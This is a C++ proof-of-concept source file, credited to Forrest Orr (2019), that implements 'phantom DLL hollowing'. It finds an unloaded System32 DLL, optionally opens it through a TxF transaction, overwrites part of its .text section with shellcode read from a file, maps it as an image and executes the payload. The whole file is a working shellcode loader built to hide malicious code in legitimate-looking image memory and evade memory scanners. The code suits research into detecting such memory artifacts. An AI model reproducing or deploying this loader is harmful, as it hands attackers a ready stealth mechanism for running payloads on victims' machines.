/* Phantom DLL hollower PoC
   https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
   Forrest Orr - 2019
   forrest.orr@protonmail.com
   Licensed under GNU GPLv3 */

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>

//
// Definitions
//

typedef LONG(__stdcall* NtCreateSection_t)(HANDLE*, ULONG, void*, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;

bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA);
void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA);

//
// Hollower logic
//

bool HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, bool bTxF) {
	WIN32_FIND_DATAW Wfd = { 0 };
	wchar_t SearchFilePath[MAX_PATH] = { 0 };
	HANDLE hFind;
	bool bMapped = false;

	//
	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
	//

	GetSystemDirectoryW(SearchFilePath, MAX_PATH);
	wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");

	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			if (GetModuleHandleW(Wfd.cFileName) == nullptr) {
				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
				wchar_t FilePath[MAX_PATH];
				NTSTATUS NtStatus;
				uint8_t* pFileBuf = nullptr;

				GetSystemDirectoryW(FilePath, MAX_PATH);
				wcscat_s(FilePath, MAX_PATH, L"\\");
				wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);

				//
				// Read the DLL to memory and check its headers to identify its image size.
				//

				if (bTxF) {
					OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

					NtStatus = NtCreateTransaction(&hTransaction,
						TRANSACTION_ALL_ACCESS,
						&ObjAttr,
						nullptr,
						nullptr,
						0,
						0,
						0,
						nullptr,
						nullptr);

					if (NT_SUCCESS(NtStatus)) {
						hFile = CreateFileTransactedW(FilePath,
							GENERIC_WRITE | GENERIC_READ,
							0,
							nullptr,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							nullptr,
							hTransaction,
							nullptr,
							nullptr);
					}
					else {
						printf("- Failed to create transaction (error 0x%x)\r\n", NtStatus);
					}
				}
				else {
					hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
				}

				if (hFile != INVALID_HANDLE_VALUE) {
					uint32_t dwFileSize = GetFileSize(hFile, nullptr);
					uint32_t dwBytesRead = 0;

					pFileBuf = new uint8_t[dwFileSize];

					if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesRead, nullptr)) {
						SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

						IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
						IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
						IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)& pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

						if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
							if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
								//
								// Found a DLL with sufficient image size: map an image view of it for hollowing.
								//

								printf("* %ws - image size: %d - .text size: %d\r\n", Wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);

								bool bTxF_Valid = false;
								uint32_t dwCodeRva = 0;

								if (bTxF) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									uint32_t dwBytesWritten = 0;

									//
									// Wipe the data directories that conflict with the code section
									//

									for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
										if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= pSectHdrs->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < (pSectHdrs->VirtualAddress + pSectHdrs->Misc.VirtualSize)) {
											pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
											pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
										}
									}

									//
									// Find a range free of relocations large enough to accomodate the code.
									//

									bool bRangeFound = false;
									uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

									if (pRelocBuf != nullptr) {
										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
												bRangeFound = true;
												break;
											}
										}

										if (bRangeFound) {
											printf("+ Found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
										}
										else {
											printf("- Failed to identify a blank region large enough to accomodate payload\r\n");
										}

										memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);

										if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesWritten, nullptr)) {
											printf("+ Successfully modified TxF file content.\r\n");
											bTxF_Valid = true;
										}
									}
									else {
										printf("- No relocation directory present.\r\n");
									}
								}

								if (!bTxF || bTxF_Valid) {
									HANDLE hSection = nullptr;
									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

									if (NT_SUCCESS(NtStatus)) {
										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.

										if (NT_SUCCESS(NtStatus)) {
											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
												printf("* %ws - mapped size: %I64u\r\n", Wfd.cFileName, *pqwMapBufSize);
												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;

												if (!bTxF) {
													uint32_t dwOldProtect = 0;

													if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)& dwOldProtect)) {
														memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);

														if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)& dwOldProtect)) {
															bMapped = true;
														}
													}
												}
												else {
													bMapped = true;
												}
											}
										}
										else {
											printf("- Failed to create mapping of section (error 0x%08x)", NtStatus);
										}
									}
									else {
										printf("- Failed to create section (error 0x%x)\r\n", NtStatus);
									}
								}
								else {
									printf("- TxF initialization failed.\r\n");
								}
							}
						}
					}

					if (pFileBuf != nullptr) {
						delete[] pFileBuf;
					}

					if (hFile != INVALID_HANDLE_VALUE) {
						CloseHandle(hFile);
					}

					if (hTransaction != INVALID_HANDLE_VALUE) {
						CloseHandle(hTransaction);
					}
				}
				else {
					printf("- Failed to open handle to %ws (error %d)\r\n", FilePath, GetLastError());
				}
			}
		} while (!bMapped && FindNextFileW(hFind, &Wfd));

		FindClose(hFind);
	}

	return bMapped;
}

//
// Helpers
//

IMAGE_SECTION_HEADER* GetContainerSectHdr(IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHeader, uint64_t qwRVA) {
	for (uint32_t dwX = 0; dwX < pNtHdrs->FileHeader.NumberOfSections; dwX++) {
		IMAGE_SECTION_HEADER* pCurrentSectHdr = pInitialSectHeader;
		uint32_t dwCurrentSectSize;

		pCurrentSectHdr += dwX;

		if (pCurrentSectHdr->Misc.VirtualSize > pCurrentSectHdr->SizeOfRawData) {
			dwCurrentSectSize = pCurrentSectHdr->Misc.VirtualSize;
		}
		else {
			dwCurrentSectSize = pCurrentSectHdr->SizeOfRawData;
		}

		if ((qwRVA >= pCurrentSectHdr->VirtualAddress) && (qwRVA <= (pCurrentSectHdr->VirtualAddress + dwCurrentSectSize))) {
			return pCurrentSectHdr;
		}
	}

	return nullptr;
}

void* GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA) {
	IMAGE_SECTION_HEADER* pContainSectHdr;

	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != nullptr) {
		uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);

		if (dwOffset < pContainSectHdr->SizeOfRawData) { // Sections can be partially or fully virtual. Avoid creating physical pointers that reference regions outside of the raw data in sections with a greater virtual size than physical.
			return (uint8_t*)(pPeBuf + pContainSectHdr->PointerToRawData + dwOffset);
		}
	}

	return nullptr;
}

bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) {
	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
	uint32_t dwRelocBufOffset, dwX;
	bool bWithinRange = false;

	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
		uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
#ifdef _WIN64
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64
#else
#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
#endif
			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
				uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));

				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
					bWithinRange = true;
				}
			}
		}

		dwRelocBufOffset += pCurrentRelocBlock->SizeOfBlock;
		pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock->SizeOfBlock);
	}

	return bWithinRange;
}

//
// Interface
//

typedef void(*fnAddr)();

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	if (nArgc < 2) {
		printf("* Usage: %ws [Shellcode file path] txf [Hollow the DLL via a TxF handle (optional)]\r\n", pArgv[0]);
	}
	else {
		bool bTxF = false;

		if (nArgc >= 3 && _wcsicmp(pArgv[2], L"txf") == 0) {
			bTxF = true;
		}

		HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
		NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
		NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
		NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");

		if (bTxF && NtCreateTransaction == nullptr) {
			bTxF = false;
			printf("- TxF is not handled on this system. Disabling preference.\r\n");
		}

		HANDLE hFile;
		const wchar_t* pFilePath = pArgv[1];

		if ((hFile = CreateFileW(pFilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr)) != INVALID_HANDLE_VALUE) {
			uint32_t dwFileSize = GetFileSize(hFile, nullptr);
			uint8_t* pFileBuf = new uint8_t[dwFileSize];
			uint32_t dwBytesRead;

			printf("+ Successfully opened %ws (size: %d)\r\n", pFilePath, dwFileSize);

			if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)& dwBytesRead, nullptr)) {
				uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
				uint64_t qwMapBufSize;

				if (HollowDLL(&pMapBuf, &qwMapBufSize, pFileBuf, dwFileSize, &pMappedCode, bTxF)) {
					printf("+ Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", pMapBuf, qwMapBufSize);
					printf("* Calling 0x%p...\r\n", pMappedCode);
					((fnAddr)pMappedCode)();
				}
			}

			delete[] pFileBuf;
			CloseHandle(hFile);
		}
		else {
			printf("- Failed to open %ws (error %d)\r\n", pFilePath, GetLastError());
		}
	}

	return 0;
}